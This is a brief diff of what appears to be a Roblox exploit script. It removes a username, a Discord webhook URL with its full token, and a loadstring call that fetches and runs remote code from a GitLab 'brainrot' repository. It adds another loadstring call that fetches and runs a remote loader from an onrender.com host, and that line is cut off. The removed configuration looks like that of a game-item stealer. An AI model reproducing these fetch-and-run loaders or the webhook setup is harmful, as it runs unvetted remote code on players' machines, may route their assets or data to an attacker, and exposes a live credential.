@@ -1,3 +1,1 @@
-Username = "brainrotsiken721"
-Webhook = "https://discord.com/api/webhooks/1394729131685449888/-4FIv1eh2jvIbAn5zNpSHCfYqvFgSRcqbyDh3VaEnxwAdhywI328mm6yTQrNXMmtgeuv"
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot"))()
+loadstring(game:HttpGet("https://luaris.onrender.com/luaris/files/scripts/loaders/fe24feef331544dcb5b40e787aa5bec9
